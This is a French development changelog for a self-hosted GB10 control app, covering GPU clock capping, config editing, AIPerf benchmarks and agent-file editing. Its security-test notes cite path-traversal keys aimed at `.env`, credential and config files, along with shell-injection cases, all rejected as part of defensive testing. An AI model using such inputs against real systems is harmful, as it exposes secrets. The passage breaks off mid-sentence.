# Tour de contrôle — changelog

## 2026-10-30 — Édition des fichiers markdown d'OpenClaw et de Hermes

Suite de l'exploration. La config des deux agents reste en lecture seule ; leurs fichiers markdown — ce
qu'on dit à l'agent au début de chaque session — deviennent éditables. Ils changent ce que l'agent se fait
dire, pas ce qu'il a le droit d'exécuter : le même statut qu'un `SKILL.md`, que l'app édite déjà, et le
même pipeline (aperçu, diff, confirmation, contrôle de hash, `.bak` horodaté, propriétaire et mode conservés).

**Les fichiers.** OpenClaw : dans chaque workspace (celui par défaut, plus ceux que déclarent les agents de
`agents.list`), `AGENTS.md`, `SOUL.md`, `USER.md`, `IDENTITY.md`, `TOOLS.md`, `HEARTBEAT.md`, `MEMORY.md`,
`BOOTSTRAP.md`, et les 31 dernières notes quotidiennes de `memory/`. Hermes : `SOUL.md`,
`memories/MEMORY.md` et `memories/USER.md`, pour le profil par défaut et chaque profil de `profiles/`. Un
fichier absent peut être créé (`memories/` compris), sauf `BOOTSTRAP.md` : c'est le rituel du premier
lancement, que l'agent supprime une fois fait.

**Seuls ces fichiers sont atteignables.** Une requête désigne un fichier par une clé, cherchée dans la liste
construite côté backend ; elle n'est jamais transformée en chemin. `default:../openclaw.json`,
`default:credentials/…` ou `default:.env` répondent 404, testés. Un lien symbolique est refusé : l'écriture
par renommage atomique remplacerait le lien par un fichier ordinaire et casserait silencieusement une
synchronisation montée par l'utilisateur.

**Les limites de chaque agent, affichées et vérifiées à l'aperçu.** OpenClaw tronque chaque fichier
d'amorçage au-delà de `bootstrapMaxChars` (20 000 par défaut) et l'ensemble au-delà de
`bootstrapTotalMaxChars` (60 000). Hermes plafonne `MEMORY.md` à `memory_char_limit` (2 200) et `USER.md` à
`user_char_limit` (1 375) ; au-delà, son outil mémoire refuse toute nouvelle entrée jusqu'à ce qu'on
repasse dessous. La valeur du `config.yaml` du profil l'emporte sur le défaut documenté, et l'interface dit
laquelle s'applique. Chaque limite est comptée comme le compte l'agent qui l'applique : en points de code
pour Hermes (Python), en unités UTF-16 pour OpenClaw (JavaScript) — un emoji vaut 1 d'un côté, 2 de l'autre.
Dépasser avertit, ne bloque pas.

**L'agent écrit aussi dans ces fichiers.** Sa mémoire surtout. Si l'agent réécrit le fichier entre l'aperçu et
la confirmation, l'écriture est refusée au lieu d'écraser ce qu'il vient d'écrire — c'est le contrôle de hash
existant, testé sur ce cas précis.

**Un diff lisible pour de la prose.** `buildLineDiff` compare ligne à ligne par position, ce qui convient à du
JSON réécrit clé par clé mais, sur du texte, marque comme modifié tout ce qui suit la première ligne insérée.
Les fichiers markdown ont leur propre diff : préfixe et suffixe communs retirés, plus longue sous-séquence
commune sur le reste, échange de bloc au-delà d'un million de cellules.

**Montages.** `compose/openclaw.yml` et `compose/hermes.yml` passent en lecture-écriture ; la liste des
fichiers accessibles reste fixée dans `backend/agents.js`, pas par le montage. `compose/nemoclaw.yml` reste en
lecture seule. Sous NemoClaw, ces fichiers vivent dans le sandbox : l'onglet renvoie vers
`nemoclaw <nom> connect`.

**Vérifié.** 77 tests backend verts (9 nouveaux) : listes et limites, clés hors liste refusées, diff d'une
insertion réduit à une ligne, aperçu sans écriture, propriétaire et mode conservés, `.bak` fidèle, conflit
quand l'agent réécrit entre-temps, création avec le propriétaire du répertoire, avertissements de limite
(décompte en points de code compris), refus de lien symbolique, de contenu inchangé, d'octet NUL et de taille
excessive. Dans Chromium sur les fixtures : édition d'`AGENTS.md` de bout en bout (diff d'une ligne, fichier
écrit, `.bak` créé), création de `USER.md` côté Hermes, liste rechargée. Build et lint propres.

**À vérifier sur la vraie machine.** Les limites et la liste des fichiers d'amorçage viennent des docs
OpenClaw et Hermes ; le chemin des profils Hermes (`profiles/<nom>/`) d'une source tierce. Un workspace
OpenClaw configuré hors de `~/.openclaw` n'est pas visible : l'interface le dit, il faudrait le monter en plus.

## 2026-10-30 — Exploration : OpenClaw et Hermes Agent dans Apps, avec ou sans NemoClaw

Branche d'exploration. La rubrique Apps gère opencode et Claude Code ; la question était de savoir comment y
faire entrer OpenClaw et Hermes Agent, selon qu'ils tournent directement sur l'hôte ou dans NemoClaw.

**Ce que NemoClaw change, et qui a dicté toute l'architecture.** Sans NemoClaw, chaque agent a sa config
sur l'hôte : `~/.openclaw/openclaw.json` (JSON5, rechargé à chaud par la passerelle, qui refuse de démarrer
sur une seule clé invalide) et `~/.hermes/config.yaml` (YAML commenté, plus `.env`, `SOUL.md`, `memories/`,
`skills/`). Avec NemoClaw, l'agent tourne dans un sandbox OpenShell (k3s dans un conteneur Docker, Landlock,
politique de sortie réseau) et sa config vit **dans le sandbox**, propriété de l'agent : depuis l'hôte, il
n'y a que le registre `~/.nemoclaw/sandboxes.json`. Les identifiants sont dans le magasin de la passerelle,
sous `~/.local/state/nemoclaw/`, avec les clés mTLS et de signature JWT.

**Fait.**

| Partie | Fichiers | Contenu |
|---|---|---|
| Backend | `backend/agents.js` (neuf), `apps.js`, `skills.js`, `insights.js`, `rules.js` | Deux entrées `openclaw` et `hermes` dans le registre. Détection par trois traces : config sur l'hôte, sandbox dans le registre NemoClaw (passerelle par défaut et `gateways/<port>/`), processus vu dans `/proc` — distingué hôte / conteneur par son cgroup. Modèle confronté à Ollama, canaux OpenClaw, backend terminal de Hermes, skills (même format SKILL.md ; les copies présentes aussi côté Claude Code sont signalées, elles divergeront). |
| Règles | `rules.js` | `openclaw-open-dm` (un canal en `dmPolicy: "open"` : n'importe qui parle à un agent qui agit sur la machine), `openclaw-model-not-served` (plus douce si un repli est servi), `hermes-model-not-served`, `nemoclaw-legacy-credentials` (fichier en clair que l'onboarding peut laisser derrière lui, NVIDIA/NemoClaw#10388 ; testé en existence, jamais lu). |
| Frontend | `AgentCommon.tsx`, `OpenclawPanel.tsx`, `HermesPanel.tsx` (neufs), `Apps.tsx`, `types.ts` | Une carte « Deployment » qui répond à la question avec/sans NemoClaw à partir de ce qui est réellement sur la machine, puis la config, et les commandes à lancer pour la modifier. |
| Compose | `docker-compose.yml`, `compose/{openclaw,hermes,nemoclaw}.yml` (neufs), `.env.example` | Variables posées, montages en overlays optionnels via `COMPOSE_FILE`. |

**Entièrement en lecture seule, volontairement.** `preview` refuse et renvoie vers la CLI de l'outil. Hors
NemoClaw, ces deux fichiers décident de ce que peut faire un agent joignable depuis une messagerie
(`dmPolicy`, `terminal.backend`) — même frontière que les permissions et hooks de Claude Code, dans une app
sans authentification. Ni le JSON5 ni le YAML commenté ne survivent à l'aller-retour parse/réécriture
qu'utilise `apps.js`. Sous NemoClaw, la config n'est même pas sur l'hôte. La lire dans le sandbox serait
possible à travers le socket Docker, mais ce serait traverser la frontière que NemoClaw installe : écarté.

**Montages optionnels, et pourquoi.** Monter un `~/.openclaw` absent le fait créer vide et root:root par
Docker, et `openclaw onboard` échoue ensuite — exactement le cas d'une machine où l'on explore avant
d'installer. Chaque overlay utilise donc `create_host_path: false` : un outil listé mais absent empêche le
démarrage au lieu de casser son installeur. Répertoires entiers plutôt que fichiers seuls : un outil qui
réécrit sa config par renommage laisserait un montage de fichier figé sur l'ancien inode (le compromis :
`credentials/` est visible du conteneur, jamais lu). `~/.local/state/nemoclaw` n'est jamais monté.

**Ce qui ne sort jamais.** Les valeurs du `.env` de Hermes (seuls les noms), `auth.json`, `state.db`
(tout l'historique), `credentials/` et les profils d'auth d'OpenClaw, les numéros des listes `allowFrom`
(seule leur taille), les identifiants dans une URL de base. Les tests l'ont attrapé deux fois : le dump brut
de la config laissait passer un numéro de `allowFrom` et le mot de passe d'un `base_url` — `mask()` ne
regarde que les noms de clés. Le dump passe désormais par le même nettoyage que les résumés. Autre piège
évité : la regex de `mask()` attrape `maxTokens` (TOKEN), donc les limites de modèle sont lues dans la
config brute, champ par champ.

**Vérifié.** 68 tests backend verts (14 nouveaux, fixtures copiées dans un répertoire temporaire, faux Ollama
local) : aucun secret des fixtures ne sort, JSON5 et YAML commentés lus, registre NemoClaw lu sur deux
passerelles et cassé sans planter, refus d'édition, règles déclenchées et silencieuses comme attendu.
`docker compose config` : trois montages en lecture seule avec les overlays, aucun sans. Build et lint du
frontend propres ; les deux onglets rendus dans Chromium sur les fixtures.

**À vérifier sur la vraie machine — rien de tout cela n'y a tourné.**
- Le schéma de `sandboxes.json` n'est pas documenté champ par champ : la lecture est tolérante et montre
  tous les champs bruts (masqués). Une entrée sans champ d'agent est supposée OpenClaw, et l'interface le
  dit. Comparer avec un vrai `cat ~/.nemoclaw/sandboxes.json`.
- Les motifs de processus (`openclaw`, `openclaw-gateway`, `node_modules/openclaw/`, `hermes`,
  `hermes_cli`) sont déduits : comparer avec `ps -eo args | grep -Ei 'openclaw|hermes'`.
- L'installation express DGX Spark configurerait un « Ollama géré » (article tiers, Classmethod) : vérifier
  qu'elle ne se dispute pas le 11434 avec le conteneur `ollama-api` existant.
- Les commandes affichées (`nemoclaw <nom> connect`, `nemohermes inference set`, `openclaw config set`,
  `hermes config set`) viennent des docs, à confirmer avec `--help` sur les versions installées.
- Sources : documentation NVIDIA NemoClaw, OpenClaw et Hermes Agent consultée via des résultats de recherche
  — docs.nvidia.com n'était pas joignable depuis la session.

**Suite possible, à décider.** Ouvrir l'édition d'une courte liste blanche (modèle par défaut), par
remplacement textuel d'une ligne comme pour `compose.yaml` ; ou s'en tenir aux commandes affichées.

**Retour arrière** : `git revert` de ce commit, retirer `COMPOSE_FILE` du `.env` s'il a été posé, puis
`docker compose up -d --build`.

## 2026-10-29 — Benchmarks : AIPerf et registre d'outils

Cadré en mode plan puis exécuté. Demande de l'utilisateur : pouvoir lancer des outils de benchmark, à
commencer par AIPerf (`ai-dynamo/aiperf`), **bien intégrés dans l'interface, faciles et visuels**. Le
besoin rejoint deux manques du dépôt : aucune mesure réelle n'existait (les chiffres de la carte du
plafond d'horloge sont communautaires, d'où le commit `d64206f`), et le « TEST EN ATTENTE » du plafond
plus bas réclame une vraie charge GPU, que la carte ne peut pas produire seule.

**Décisions de l'utilisateur.** Outil dans un conteneur jetable (pas dans l'image de l'app) ; registre
d'outils extensible, AIPerf seul adaptateur livré ; historique sur disque ; dès la v1, cibles
auto-détectées, télémétrie GB10 du run et balayage de concurrence.

**Faits établis en faisant tourner AIPerf 0.13.0 pour de vrai** (contre un faux serveur OpenAI, en local) :
- avec `--artifact-dir` explicite, le résumé est à la racine, mais AIPerf en écrit aussi des copies par
  phase sous `phases/warmup|profiling/` — le parseur les ignore explicitement ;
- **SIGTERM tue AIPerf sans rien exporter ; SIGINT** lui fait écrire des résultats partiels
  (`was_cancelled: true`) et rendre la main en ~1 s. Annulé avant sa phase de mesure, il peut en revanche
  rester bloqué : un second SIGINT, puis SIGKILL — arrêt borné à ~25 s ;
- quand toutes les requêtes échouent (serveur absent), **aucun résumé n'est écrit** et le code de sortie
  vaut 1 : le message d'erreur du run est tiré des dernières lignes de l'outil (« Nothing answered at… ») ;
- le tokenizer `builtin` n'est pas « zéro réseau » : tiktoken télécharge son fichier une fois — mis en
  cache dans `hf-cache/tiktoken` ;
- `HF_HUB_OFFLINE=1` casse le chargement d'un tokenizer local dans AIPerf 0.13 : jamais posé ;
- **AIPerf 0.13 dépend en dur de `crick`, sans wheel Linux aarch64** : un simple `pip install` dans
  `python:3.12-slim` échouerait sur le Spark faute de compilateur. Image en deux étages (compilation
  dans `python:3.12`, final `python:3.12-slim`), vérifiée en forçant la compilation de crick depuis les
  sources : construite de bout en bout par le chemin de l'app (dockerode), 1,7 Go, puis un palier joué
  dessus.

**Le déploiement GitHub n'a pas servi de modèle** : il appelle la CLI `docker`, absente de l'image (tâche
séparée proposée). Tout passe ici par dockerode : build, création, attache, attente, suppression.

**Frontière de confiance.** L'app lance des conteneurs en réseau hôte via docker.sock. L'image est figée
dans le registre, jamais lue de la requête ; chaque paramètre passe une liste blanche bornée (clé inconnue
= 400, booléen refusé là où un entier est attendu) ; l'`argv` est construit en code, sans shell ; URL et
nom de modèle validés et jamais en `-…` ; tokenizer limité à `auto`, `builtin`, un id HF ou un dossier
sous `/hf/` ; la clé API éventuelle va à l'outil mais n'est ni dans `run.json` ni dans les logs ; l'id de
run est vérifié par regex avant tout accès disque ; lancer/arrêter exige un corps JSON (pas de POST
cross-site sans préflight). Le conteneur d'outil ne voit que son dossier de palier et le cache tokenizers.

**Comparabilité, leçon de `d64206f` appliquée.** Chaque run porte une empreinte de sa charge (tailles,
nombre de requêtes, seed…), sans le modèle, le serveur, le plafond ni la concurrence — ce qu'on compare.
La vue de comparaison met en gras ce qui diffère et affiche un bandeau quand les charges ne sont pas les
mêmes.

| Lot | Fichiers | Contenu |
|---|---|---|
| 1 | `backend/benchtools.js`, `benchtargets.js`, `benchmarks.js` (neufs) | Registre (adaptateur AIPerf : Dockerfile, schéma de paramètres, argv, parseur), détection des serveurs par sonde `/v1/models`, exécuteur un-conteneur-par-palier avec SSE, télémétrie 1 s, verdict du plafond, stockage atomique, réconciliation au démarrage. |
| 2 | `backend/index.js`, `gb10.js`, `metrics.js`, `hostports.js` | Montage du routeur avant le 404 ; `buildFullState` exporté ; `readGpuSample()` ; résolution des ports déplacée dans `hostports.js`, partagée par `/api/containers` et la détection. |
| 3 | `frontend/src/components/Benchmarks.tsx`, `BenchNewRun.tsx`, `BenchRunView.tsx`, `BenchHistory.tsx`, `BenchCompare.tsx`, `BenchCharts.tsx`, `LogView.tsx`, `lib/bench.ts` (neufs) | Parcours en trois choix (serveur détecté, type de travail, charge), vue en direct, résultats, historique, comparaison. Couleurs de séries validées (daltonisme, contraste) en clair et en sombre. |
| 4 | `App.tsx`, `Sidebar.tsx`, `Gb10.tsx`, `ConfirmModal.tsx`, `DeployLog.tsx`, `types.ts`, `index.css` | Entrée de menu avec point animé pendant un run, pastille « Benchmark 2/4 » sur toutes les pages, mesures réelles et bouton « vérifier le plafond sous charge » dans la carte GB10, variante non destructive de la confirmation, log partagé. |
| 5 | `docker-compose.yml`, `README.md`, `README.fr.md`, tests + fixtures AIPerf réelles | Montage `/var/lib/spark-control-center/benchmarks` (rw sous le parent `:ro`, vérifié), `BENCH_PROBE_HOST`. 31 tests ajoutés (85 au total). |

### ⏳ À jouer sur le Spark (impossible dans le conteneur de développement, sans GPU)

1. `docker compose up -d --build`, puis vérifier que `/var/lib/spark-control-center/benchmarks` existe.
2. Benchmarks → le serveur (Ollama ou vLLM) et ses modèles sont proposés → « Quick sweep », chat.
3. Premier run : le build de l'image aarch64 s'affiche dans le log (compilation de crick comprise).
4. Lire le verdict du plafond sous charge et le comparer à `nvidia-smi` pendant le run : **c'est le test
   en attente ci-dessous, enfin jouable**. Refaire le même run à un autre plafond, puis « Compare ».

## 2026-09-12 — « Spark Control Center » v1 : rubrique de configuration GB10 (famille GPU/thermique)

Cadré via `/architect` puis exécuté en 4 lots parallèles. Origine : des freezes du GB10 sous charge GPU
soutenue, confirmés par l'utilisateur, dont la cause documentée est un pic de puissance 14 W → 85 W qui
déclenche la protection de surintensité (et non un throttle thermique). Le correctif — plafonner
l'horloge GPU — devient une fonctionnalité pilotable de l'app au lieu d'un script à lancer à la main.

**Problème d'architecture résolu.** Le conteneur est `Privileged=false` / `CapAdd=[]` : il lit
`nvidia-smi` mais ne peut ni changer une horloge, ni toucher au swap, ni écrire dans `/etc/systemd`.
Chaîne retenue : l'app écrit un état désiré JSON dans `/etc/gb10-tuning/state.json` (bind-monté) →
`gb10-tuning.path` (systemd) détecte le changement → `gb10-tuning.service` (oneshot, root) applique et
écrit `result.json`, relu par l'app. `WantedBy=multi-user.target` rejoue l'état au boot. Le conteneur
ne gagne aucun privilège. Écartés : conteneur privilégié, conteneur privilégié par action via
docker.sock, agent HTTP maison.

**Frontière de confiance.** Le JSON est écrit par une app web **sans authentification** et pilote des
commandes root. `apply.py` valide par liste blanche stricte (5 clés, bornes typées), exclut
explicitement les booléens là où un entier est attendu (`True == 1` en Python), et construit ses `argv`
en code explicite par clé avec `subprocess.run(shell=False)` — aucune chaîne issue du JSON n'atteint
jamais une commande. C'est aussi la raison du passage du bind de `0.0.0.0:8081` à `127.0.0.1:8081`.

| Lot | Fichiers | Contenu |
|---|---|---|
| 1 | `host/gb10-tuning/{apply.py,test_apply.py,gb10-tuning.path,gb10-tuning.service,gb10-thermal-monitor.service}` (neufs) | Script root à liste blanche + unités systemd + auto-test. **Non installés** : commande d'installation documentée, à lancer par l'utilisateur. |
| 2 | `backend/gb10.js` (neuf), `backend/index.js` (+2 lignes) | `GET/PUT /api/gb10/state`, `POST /api/gb10/reapply`. Lit le réel (nvidia-smi, `/proc/meminfo`, `/proc/sys/vm/swappiness`, `/proc/*/cmdline`), calcule les 6 états de divergence. Routeur inséré **avant** le 404 `/api`. |
| 3 | `frontend/src/components/Gb10.tsx` (neuf), `App.tsx`, `Sidebar.tsx`, `types.ts` | Portail GB10 en page d'accueil, une carte par réglage affichant Désiré / Réel / badge. Le front ne recalcule aucune divergence. |
| 4 | `docker-compose.yml`, `frontend/index.html`, les 2 `package.json`, `README.md`, `README.fr.md` | Renommage « Spark Control Center », bind `127.0.0.1:8081`, montage `/etc/gb10-tuning`, section d'installation FR+EN. Service compose toujours `app`, conteneur non renommé. |

**Réglages v1** : plafond d'horloge GPU (défaut 2100 MHz, réglable, `null` = retrait), mode persistance,
swap (`swapoff` + `vm.swappiness`, avec refus si plus de 512 Mio de swap sont utilisés — un `swapoff`
sous pression mémoire peut déclencher un OOM kill), monitoring thermique (pilote le script existant
`/home/sparks/comfyui-spark/thermal-monitor.sh`). Plus une section informative en lecture seule sur les
variables d'environnement recommandées (`CUDA_CACHE_MAXSIZE`, `NCCL_P2P_DISABLE`) et à bannir
(`CUDA_CACHE_DISABLE`, `PYTORCH_NO_CUDA_MEMORY_CACHING`).

**Honnêteté d'affichage** : certaines unités GB10 ignorent `nvidia-smi -lgc` selon leur firmware. L'état
réel est donc systématiquement relu et comparé au désiré ; un interrupteur ne s'affiche jamais « actif »
sur la seule foi de l'écriture du JSON. Vérifié en conditions réelles : après une application en
simulation, `gpuClockLimitMhz` et `vmSwappiness` sont bien ressortis en `diverged` alors que le script
rapportait `ok` sur ses actions.

**Correction faite en vérification** (aucun lot ne pouvait la voir) : le backend calculait
`status.vmSwappiness` mais le frontend ne le consommait nulle part — une divergence sur le swappiness
serait restée sans badge. Un `<Badge status={state.status.vmSwappiness} />` ajouté dans la carte Swap
(`Gb10.tsx`), build et lint repassés.

**Vérifié** : tests unitaires du lot 1 rejoués + batterie adverse indépendante de 10 cas (injection shell,
`True` passé comme entier, flottants, bornes 300/3003, clés piégeuses `__proto__`/`argv`) → aucune chaîne
JSON n'atteint un `argv` ; 6 corps invalides rejetés en 400 et 4 valeurs limites acceptées côté API ;
routes existantes intactes (`/api/containers` 200, `/api/inconnue` 404) ; boucle complète
état→application→relecture en simulation (`GB10_DRY_RUN=1`) ; chaque champ lu par le front existe dans
la réponse réelle de l'API ; les trois validations indépendantes (script root, backend, champ UI)
donnent bien `[300,3003]` et `[0,100]` ; production reconstruite et fonctionnelle, zéro erreur console.

**État machine inchangé** : horloges 2418/3003 MHz, persistance déjà `Enabled` avant ce chantier,
`vm.swappiness` toujours à 60, swap toujours actif. Aucune unité systemd installée, aucun `sudo` exécuté.
`/etc/gb10-tuning` existe désormais mais vide — créé par le bind-mount Docker.

**Reste à faire par l'utilisateur** : installer la chaîne systemd (bloc `sudo` documenté dans les deux
READMEs). Tant qu'elle n'est pas installée, l'UI affiche un bandeau et désactive les contrôles.

**Retour arrière** : `git revert` de ce commit, puis `docker compose up -d --build`. Si la chaîne systemd
a été installée entre-temps : `sudo systemctl disable --now gb10-tuning.path gb10-tuning.service` et
`sudo nvidia-smi -rgc` pour rendre au GPU ses horloges d'usine.

**Hors périmètre v1, prévu ensuite** : réglages par application appliqués automatiquement (ComfyUI,
Ollama, vLLM), fiches de recommandation par application, diagnostic automatique des pièges connus
(ex. SageAttention retombant silencieusement sur PyTorch faute de `python3.12-dev`, 20× plus lent),
moteur de propositions d'optimisation, authentification.

## 2026-09-12 — Correctif post-installation : n'appliquer que ce qui est explicitement réglé + explication de chaque paramètre

Chaîne systemd installée par l'utilisateur et vérifiée fonctionnelle (unités en place, `gb10-tuning.path`
actif, service exécuté une fois en exit 0, conteneur en `uid=0` capable d'écrire dans `/etc/gb10-tuning`).
Deux défauts constatés à ce moment-là, tous deux issus de la même racine — les valeurs par défaut étaient
traitées comme un état désiré déjà enregistré :

1. **Le premier `Apply`, quel que soit le bouton cliqué, écrivait les 5 réglages par défaut** (`PUT` fusionnait
   le body dans `DEFAULT_DESIRED`). Activer le monitoring thermique aurait donc aussi cappé le GPU à 2100 MHz
   et fait passer `vm.swappiness` de 60 à 10. Inacceptable sur une surface qui pilote du root : l'interface ne
   doit faire que ce qu'on lui demande.
2. **Les badges affichaient `Diverged`** sur des réglages jamais configurés (défaut affiché 2100 vs machine à
   2418), laissant croire à un échec d'application là où il n'y avait simplement aucun réglage posé.

Correctif (`backend/gb10.js`, `frontend/src/components/Gb10.tsx`, `frontend/src/types.ts`) : séparation de
l'état STOCKÉ (ce que l'utilisateur a réellement posé) et de l'état AFFICHÉ (stocké fusionné sur les défauts,
pour remplir les champs). Le `PUT` et le `POST /reapply` fusionnent désormais dans le stocké — vérifié : un
`PUT {"thermalMonitor":true}` sur une installation vierge n'écrit que `version`, `updatedAt`, `thermalMonitor`,
et un second `PUT` cumule sans matérialiser le reste. Nouvel état `unset` évalué avant tous les autres, rendu
en `Not configured`. `apply.py` n'a pas bougé : il ne produisait déjà d'action que pour les clés présentes.

Ajout d'une explication sous chaque carte (persistance GPU, swap, `vm.swappiness`, monitoring thermique) —
ce que fait le réglage, pourquoi, et sa contrepartie s'il y en a une. La carte « GPU clock cap » et la section
« Environment variables » avaient déjà la leur.

**Correction faite en vérification** : le remplacement de la note du monitoring thermique avait fait disparaître
le chemin du script piloté (`/home/sparks/comfyui-spark/thermal-monitor.sh`) ; remis dans le texte.

**État machine après ce lot, inchangé** : `/etc/gb10-tuning` ne contient que `result.json` (aucun réglage posé),
`vm.swappiness` toujours à 60, horloges toujours 2418/3003 MHz. Les 5 réglages s'affichent en `Not configured`.
Rien ne sera appliqué tant que l'utilisateur n'aura pas cliqué un `Apply`.

## ⏳ TEST EN ATTENTE — validation réelle du plafond d'horloge GPU (posé le 2026-09-12, non joué)

Tout est en place et vérifié **sauf la seule chose qui ne peut l'être qu'en conditions réelles** : est-ce
que CE GB10 accepte `nvidia-smi -lgc` ? Le fil NVIDIA rapporte des unités où la commande est silencieusement
ignorée selon le firmware (utilisateur `knitvoger1`), et c'est précisément pour ça que l'UI compare l'état
désiré à l'état réel.

**Protocole** : dans la rubrique GB10, saisir `2100` dans le champ du plafond d'horloge, cliquer `Apply`,
puis lire le badge de la carte.
- Badge `ok` → le firmware accepte, le correctif anti-freeze est actif (et rejoué à chaque boot).
- Badge `diverged` avec le message « GPU running above the requested cap — this firmware likely ignores -lgc »
  → le firmware ignore la commande ; il faudra chercher un autre levier (aucune limite de watts n'existe sur
  GB10, `Power Limit: N/A`).
- Badge `unverified` (« GPU idle, cap not observable ») → le GPU est au repos, l'horloge ne monte pas assez
  pour que le plafond soit observable : refaire la lecture pendant une vraie charge GPU.

**Vérification en ligne de commande, en parallèle** :
`nvidia-smi --query-gpu=clocks.sm,clocks.max.sm --format=csv` puis `cat /etc/gb10-tuning/result.json`.

**Contexte utile au moment du test** : état de départ 2418 MHz applicatif / 3003 MHz max, `vm.swappiness` à 60,
swap actif, aucun réglage posé (les 5 cartes affichent `Not configured`). Le vrai juge de paix reste une
génération longue (LTX/vidéo) sans freeze, pas seulement le badge.

## 2026-09-12 — Étape 1 « Apps » : rubrique par application, pipeline d'édition et moteur de constats

Suite de la feuille de route GB10, cadrée avec l'utilisateur : l'interface ne doit pas devenir une usine
à gaz en accumulant un réglage par carte. **Inversion de l'unité d'affichage** : la page GB10 montre
désormais des *constats* (ce qui est actionnable maintenant sur cette machine) plutôt que le catalogue de
tout ce qui est réglable — sa longueur suit le nombre de problèmes réels. Le catalogue complet vit dans
une nouvelle rubrique **Apps**, à onglets horizontaux, un par application détectée.

3 lots parallèles (propriété de fichiers disjointe, contrat d'API figé au plan) + une passe de traduction.

| Lot | Livré | Modèle |
|---|---|---|
| 1 | `backend/apps.js` (registre + pipeline d'édition), `rules.js` (3 règles), `insights.js`, `apps.test.js` (9 tests), +4 lignes dans `index.js`, +1 volume au compose | opus |
| 2 | `Apps.tsx`, `ComfyUiPanel.tsx`, `EditConfirm.tsx` + `App.tsx`/`Sidebar.tsx`/`types.ts` | sonnet |
| 3 | `Insights.tsx` + retrait du bloc env informatif de `Gb10.tsx` | sonnet |
| — | Passe de traduction FR→EN sur les 6 fichiers (l'UI de l'app est en anglais) | sonnet |

**Pipeline d'édition (le cœur)** : lire → `preview` (diff + avertissements, n'écrit rien, renvoie un token
portant le hash du contenu lu) → confirmation explicite dans une modale → `apply` → sauvegarde horodatée
→ écriture atomique (fichier temporaire + `rename`) **préservant mode/uid/gid d'origine** → annonce de ce
qu'il faut redémarrer. Un `apply` n'est atteignable que par la modale ; un token rejoué ou un fichier
modifié entre-temps est refusé (400 / 409).

**Décision imposée par le réel** : le conteneur n'a pas le binaire `docker`, et surtout modifier
`COMFY_CMDLINE_EXTRA` exige une *recréation* du conteneur (un `restart` ne relit jamais l'environnement).
D'où deux comportements : un script bascule avec un vrai bouton de redémarrage (bind-mount relu au
démarrage, via la route existante `POST /api/containers/:id/restart`), tandis qu'un changement de ligne
de commande affiche la commande hôte à copier, avec la raison. Pas de recréation maison via dockerode :
elle désynchroniserait le hash de configuration de compose sur un conteneur de production.

**Deux pièges du fichier cible, traités explicitement** :
1. `comfyui-spark/compose.yaml` est truffé de commentaires de valeur ET contient **deux** lignes
   `COMFY_CMDLINE_EXTRA` — la 26 active et la **27 commentée**, qui propose justement
   `--use-sage-attention --bf16-*`. L'édition est textuelle et chirurgicale (aucun sérialiseur YAML, la
   regex ignore les lignes commentées). Vérifié : 2 lignes au diff, 19 commentaires avant comme après,
   ligne 27 intacte, fichier résultant valide pour `docker compose config`.
2. Ce fichier contient un `HF_TOKEN` en clair. Toute clé d'environnement dont le nom contient
   `TOKEN`/`KEY`/`SECRET`/`PASSWORD` sort masquée en `***`. Vérifié en réel : zéro occurrence de `hf_`
   dans les réponses d'API.

**Constats livrés (3, volontairement)** : plafond d'horloge non posé (high), `vm.swappiness` à 60
(medium), ComfyUI en attention PyTorch (medium, avec la réserve honnête que les scripts 20/21 sont
bloqués par un `-std=c++17` figé). **Rien** sur `CUDA_CACHE_MAXSIZE`/`NCCL_P2P_DISABLE`, déjà corrects :
c'est tout l'intérêt du modèle.

**Vérifications faites par l'orchestrateur** : suite de tests du lot 1 rejouée (9/9) + campagne adverse
indépendante sur copie (injections ` #`, saut de ligne, espace en tête → rejetées ; rejeu de token →
refusé) ; coutures vérifiées **dans les deux sens** (aucun champ produit non consommé, aucune URL
orpheline) ; `envAdvice` éliminé des deux côtés ; production ComfyUI prouvée intacte après chaque
campagne (mtime, propriété, absence de `.bak`) ; parcours réel dans le navigateur jusqu'à la modale de
diff, fermée sans écrire.

**Corrections faites en vérification** : suppression des types `Gb10EnvAdvice`/`Gb10EnvAdviceItem` morts
(délibérément sortis du périmètre des lots pour éviter une course au build entre deux lots) ; passe de
traduction complète, la fonctionnalité étant arrivée en français dans une UI anglaise.

**Hors périmètre, prochaines étapes** : onglets Ollama et opencode (étape 2), puis Claude Code (étape 3 :
skills — voir/activer/éditer/créer —, plugins et MCP en lecture seule, `settings*.json` éditable SAUF
`hooks` et `permissions`, qui resteraient une exécution de code arbitraire pilotable depuis une UI sans
authentification).

## 2026-09-12 — Étape 2 : réglage Ollama pour le codage, onglet opencode, masquage de ComfyUI

### Réglage Ollama (appliqué hors application, sur demande de l'utilisateur)

Constat de départ : opencode déclarait 262144 de contexte pour ses 4 modèles (le contexte natif du modèle,
`qwen35.context_length`), alors que le serveur Ollama tournait avec `OLLAMA_CONTEXT_LENGTH=65536`. opencode
passe par l'API compatible OpenAI, qui n'accepte pas de `num_ctx` par requête : le défaut du serveur fait
donc foi, et les longues conversations étaient **tronquées silencieusement**. Aucun des deux outils ne peut
voir ce défaut seul.

Coût mémoire **mesuré** avant de choisir (modèle `orcarouter-qwen3.8-27b`, KV en q8_0) : 8K → 21,8 Gio ;
64K → 24,3 Gio ; 128K → 26,5 Gio, soit ~2,2 Gio par tranche de 64K. 256K resterait abordable (~31 Gio sur
121), mais plusieurs sources rapportent des instabilités de graphes CUDA au-delà de 128K sur GB10 (une
recette GLM documentée redescend à 96K pour cette raison) et l'outillage d'optimisation propre à cette
machine retient 131K. Valeur retenue : **131072**, mesurée et corroborée, plutôt que le maximum théorique.

Appliqué en recréant le conteneur (spécification sauvegardée dans `~/backups/ollama-api-spec-20260912.json`,
volume nommé `ollama-data` conservé) :
- `OLLAMA_CONTEXT_LENGTH` 65536 → **131072**
- `OLLAMA_MAX_LOADED_MODELS` 3 → **2** — devenu nécessaire : à ~26,5 Gio par modèle chargé, trois modèles
  résidents affameraient ComfyUI, qui puise dans la **même** mémoire unifiée. À 2, le modèle de codage et
  `gemma4:e4b` (enrichissement de prompt des studios) cohabitent.
- Inchangés volontairement : `NUM_PARALLEL=1` (dans Ollama le cache KV est alloué en *contexte × parallélisme* ;
  les guides génériques conseillent 2-4 mais supposent des contextes bien plus petits), `FLASH_ATTENTION=1` et
  `KV_CACHE_TYPE=q8_0` (ce sont eux qui rendent 128K abordable), `KEEP_ALIVE=30m`.
- `opencode.json` aligné sur 131072 (sauvegarde `~/backups/opencode.json.bak-20260912`).

Vérifié : contexte effectif 131072, 26,5 Gio résident, 4 modèles intacts, open-webui et canvas-ai-studio
